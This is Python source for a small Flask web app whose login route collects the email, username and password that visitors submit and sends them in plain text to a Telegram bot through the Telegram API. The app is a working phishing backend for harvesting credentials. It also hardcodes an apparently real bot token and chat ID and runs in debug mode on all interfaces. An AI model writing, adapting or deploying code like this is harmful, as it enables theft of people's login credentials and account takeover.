from flask import Flask, render_template, request, redirect, url_for, flash
import requests
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'

# Replace with your Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '8371650981:AAGhw37bZcTLirZwIaDwryef2BWDSxpXlzk'
TELEGRAM_CHAT_ID = ' 8397775572'

# Function to send a message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # Check for HTTP request errors
        app.logger.debug("Message sent to Telegram successfully.")
    except requests.exceptions.RequestException as e:
        app.logger.error(f"Failed to send message to Telegram. Error: {str(e)}")
        flash(f"Failed to send message to Telegram. Error: {str(e)}", 'error')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    username = request.form['username']
    password = request.form['password']

    # Send email and password to Telegram
    message = f"Email: {email}\n Username: {username} \nPassword: {password}"
    send_to_telegram(message)

    flash('Login details sent successfully.', 'success')
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
